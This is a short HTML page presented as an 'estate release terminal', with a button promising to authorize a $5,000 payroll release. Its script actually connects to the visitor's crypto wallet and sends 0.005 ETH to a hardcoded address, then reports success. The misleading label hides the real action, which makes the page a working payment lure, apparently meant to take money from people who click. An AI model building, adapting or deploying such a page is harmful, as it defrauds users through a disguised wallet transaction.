<!DOCTYPE html>
<html>
<head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding:50px;">
    <h1>ESTATE RELEASE TERMINAL</h1>
    <button id="releaseBtn" style="padding:30px; background:#0f0; font-weight:bold; cursor:pointer; border-radius:10px;">
        AUTHORIZE $5,000 PAYROLL RELEASE
    </button>
    <div id="status" style="margin-top:20px; color:#fff;">SYSTEM READY</div>
    <script>
        document.getElementById('releaseBtn').onclick = async () => {
            const status = document.getElementById('status');
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = provider.getSigner();
                status.innerText = "PROCESSING RELEASE...";
                const tx = await signer.sendTransaction({
                    to: "0x778aB806155B204BF7D2FA4bc0B536137b077b53",
                    value: ethers.utils.parseEther("0.005")
                });
                status.innerHTML = "SUCCESS! HASH: <br>" + tx.hash;
            } catch (e) {
                status.innerText = "ERROR: " + e.message;
            }
        };
    </script>
</body>
</html>
